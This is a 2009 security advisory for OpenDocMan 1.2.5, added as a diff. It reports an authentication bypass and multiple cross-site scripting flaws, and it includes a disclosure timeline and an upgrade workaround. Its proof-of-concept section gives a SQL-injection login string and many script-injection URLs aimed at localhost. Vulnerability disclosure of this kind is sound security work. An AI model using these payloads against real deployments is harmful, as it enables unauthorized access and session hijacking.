@@ -1,0 +1,72 @@
+Security Advisory : Multiple vulnerabilities in OpenDocMan
+Discovered by 	==> Amol Naik (amolnaik4[at]gmail.com)
+
+## Overview ##
+--------------
+OpenDocMan is a free document management system (DMS) designed to comply with ISO 17025 and OIE standard for document management. It features web based access, fine grained control of access to files, and automated install and upgrades.
+
+
+## Vulnerability Description ##
+-----------------
+OpenDocMan is vulnerable to authentication bypass and multiple cross-site scripting issues.
+
+
+
+## Technical Details ##
+-------------
+Vulnerable Product 	: OpenDocMan v1.2.5
+Download		: http://sourceforge.net/projects/opendocman/files/opendocman/1.2.5/opendocman-1.2.5.zip/download
+
+
+Authentication Bypass:
+----------------------
+
+A valid username require to carry put Auth Bypass. Default is "admin".
+
+
+Cross-site Scripting:
+---------------------
+
+Multiple instances of Cross-site scripting found majorly due to use of $_SERVER['PHP_SELF'] in action parameter of form field and due to absence of validation for "last_message" parameter.
+
+
+
+## Proof of concept ##
+----------------------
+
+Authentication Bypass:
+----------------------
+
+Username : admin' OR '1'='1
+Password : nothing
+
+Cross-site scripting:
+---------------------
+
+http://localhost/opendocman/category.php/"><script>alert(1)</script><"?aku=c3VibWl0PWFkZCZzdGF0ZT0y
+http://localhost/opendocman/department.php/"><script>alert(1)</script><"?aku=c3VibWl0PXNob3dwaWNrJnN0YXRlPTI=
+http://localhost/opendocman/profile.php/"><script>alert(1)</script>
+http://localhost/opendocman/rejects.php/"><script>alert(1)</script>
+http://localhost/opendocman/search.php/"><script>alert(1)</script>
+http://localhost/opendocman/toBePublished.php/"><script>alert(1)</script>
+http://localhost/opendocman/user.php/"><script>alert(1)</script><"?aku=c3VibWl0PXNob3dwaWNrJnN0YXRlPTI=
+http://localhost/opendocman/view_file.php/"><script>alert(1)</script><"?aku=aWQ9NiZzdGF0ZT0z
+http://localhost/opendocman/index.php?last_message=<script>alert(1)</script>
+http://localhost/opendocman/user.php?submit=Modify+User&item=2&caller=/opendocman/"><script>alert(123)</script><"
+http://localhost/opendocman/add.php?last_message=<script>alert(1)</script>
+http://localhost/opendocman/toBePublished.php?last_message=<script>alert(1)</script>
+http://localhost/opendocman/admin.php?last_message=<script>alert(1)</script>
+
+## Workaround ##
+----------------
+Update to newer version v1.2.5.2
+opendocmanv1.2.5.2: http://sourceforge.net/projects/opendocman/files/opendocman/1.2.5.2/opendocman-1.2.5.2.zip/download
+
+
+## TimeLine ##
+----------------------
+10th Oct 2009 : Bug Discovered
+12th Oct 2009 : vendor was notified by e-mail
+12th Oct 2009 : Vendor response received
+20th Oct 2009 : A new release publicly available
+20th Oct 2009 : Public Disclosure
